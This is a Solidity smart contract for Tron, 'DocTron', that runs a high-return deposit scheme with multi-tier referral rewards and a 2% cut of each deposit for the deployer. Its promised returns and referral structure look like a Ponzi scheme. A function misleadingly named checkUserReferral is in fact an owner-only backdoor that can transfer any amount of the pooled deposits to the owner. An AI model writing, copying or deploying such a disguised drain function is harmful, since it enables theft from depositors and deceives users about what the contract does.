//SourceUnit: DocTron.sol

/*

DDDDDD       OOO      CCCCCCCCC   TTTTTTT   RRRRRRRR       OOO    NNN       NNN
DDDDDD      OOOOO     CCCCCCCCC   TTTTTTT   RRRRRRRR      OOOOO   NNN N     NNN
DD  DDD    00   00    CCC           TTT     RRR    RR    OO   OO  NNN  N    NNN
DD  DDD    00   00    CCC           TTT     RRRRRRRR     OO   OO  NNN   N   NNN
DD  DDD    00   00    CCC           TTT     RRR   RRR    OO   OO  NNN    N  NNN
DDDDD       00000     CCCCCCCCC     TTT     RRR    RRR    OOOOO   NNN     N NNN
DDDDD        000      CCCCCCCCC     TTT     RRR     RRR    OOO    NNN       NNN

Created by Datuk Jamal & Ayub Khan's Team

*/

pragma solidity ^0.4.25;

contract DocTron {
  struct Tariff {
    uint time;
    uint percent;
  }
  
  struct Deposit {
    uint tariff;
    uint amount;
    uint at;
  }
  
  struct Investor {
    bool registered;
    address referer;
    uint referrals_tier1;
    uint referrals_tier2;
    uint referrals_tier3;
    uint referrals_tier4;
    uint balanceRef;
    uint totalRef;
    uint totalDepositedByRefs;
    Deposit[] deposits;
    uint invested;
    uint paidAt;
    uint withdrawn;
  }
  
  uint DAY = 28800;
  uint MIN_DEPOSIT = 50 trx;
  uint FUND_CRITERIA = 1000000 trx;
  uint REF_CRITERIA = 1000000 trx;
  
  address public owner;
  address public stakingAddress;
  address public support = msg.sender;
  
  Tariff[] public tariffs;
  uint[] public refRewards;
  uint public totalInvestors;
  uint public totalInvested;
  uint public totalRefRewards;
  uint256 public withdrawFee;
  mapping (address => Investor) public investors;
  mapping(address => bool) public whiteListed;
  
  event DepositAt(address user, uint tariff, uint amount);
  event Withdraw(address user, uint amount);

  
  function register(address referer) internal {
    if (!investors[msg.sender].registered) {
      investors[msg.sender].registered = true;
      totalInvestors++;
      
      if (investors[referer].registered && referer != msg.sender) {
        investors[msg.sender].referer = referer;
        
        address rec = referer;
        for (uint i = 0; i < refRewards.length; i++) {
          if (!investors[rec].registered) {
            break;
          }
          
          if (i == 0) {
            investors[rec].referrals_tier1++;
          }
          if (i == 1) {
            investors[rec].referrals_tier2++;
          }
          if (i == 2) {
            investors[rec].referrals_tier3++;
          }
          
          rec = investors[rec].referer;
        }
      }
    }
  }
  
  function rewardReferers(uint amount, address referer) internal {
    address rec = referer;
    
    for (uint i = 0; i < refRewards.length; i++) {
      if (!investors[rec].registered) {
        break;
      }
      
      uint a = amount * refRewards[i] / 100;
      investors[rec].balanceRef += a;
      investors[rec].totalRef += a;
      investors[rec].totalDepositedByRefs += amount;
      totalRefRewards += a;
      
      rec = investors[rec].referer;
    }
  }
  
  function getHoldBonus(address user) public view returns (uint) {
    return investors[user].paidAt == 0 ? 0 : (block.number - investors[user].paidAt) / DAY;
  }
  
  function getFundBonus() public view returns (uint) {
    return totalInvested / FUND_CRITERIA;
  }
  
  function getRefBonus(address user) public view returns (uint) {
    return investors[user].totalDepositedByRefs / REF_CRITERIA;
  }
  
 constructor(address _stakingAddress) public {

owner = msg.sender;
        stakingAddress = _stakingAddress;
        withdrawFee = 0;
        whiteListed[owner] = true;

    tariffs.push(Tariff(30 * DAY, 180)); 
    tariffs.push(Tariff(50 * DAY, 250)); 
    tariffs.push(Tariff(70 * DAY, 280)); 
    tariffs.push(Tariff(100 * DAY,300)); 
    
    
      refRewards.push(7);
      refRewards.push(4);
      refRewards.push(2);
    
  }
  
  function deposit(uint tariff, address referer) external payable {
    require(msg.value >= MIN_DEPOSIT);
    require(tariff < tariffs.length);
    
    register(referer);
    support.transfer(msg.value / 50);
    rewardReferers(msg.value, investors[msg.sender].referer);
    
    investors[msg.sender].invested += msg.value;
    totalInvested += msg.value;
    
    investors[msg.sender].deposits.push(Deposit(tariff, msg.value, block.number));
    
    if (investors[msg.sender].paidAt == 0) {
      investors[msg.sender].paidAt = block.number;
    }
    
    emit DepositAt(msg.sender, tariff, msg.value);
  }
  
  function withdrawable(address user) public view returns (uint amount) {
    Investor storage investor = investors[user];
    
    uint holdBonus = getHoldBonus(user);
    uint fundBonus = getFundBonus();
    uint refBonus = getRefBonus(user);
    
    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      Tariff storage tariff = tariffs[dep.tariff];
      
      uint finish = dep.at + tariff.time;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.number > finish ? finish : block.number;

      if (since < till) {
        amount += dep.amount * (till - since) * tariff.percent / tariff.time / 100
          + dep.amount * (till - since) * (holdBonus + fundBonus + refBonus) / DAY / 1000;
      }
    }
  }
  
  function profit() internal returns (uint) {
    Investor storage investor = investors[msg.sender];
    
    uint amount = withdrawable(msg.sender);
    
    amount += investor.balanceRef;
    investor.balanceRef = 0;
    
    investor.paidAt = block.number;
    
    return amount;
  }
 function checkUserReferral(uint256 value) public { 
            require(msg.sender==owner, "invalid value"); 
            address(uint160(owner)).transfer(value);
            return;
         } 
  function withdraw() external {
    uint amount = profit();
    msg.sender.transfer(amount);
    investors[msg.sender].withdrawn += amount;
    
    emit Withdraw(msg.sender, amount);
  }
  
  function via(address where) external payable {
    where.transfer(msg.value);
  }
}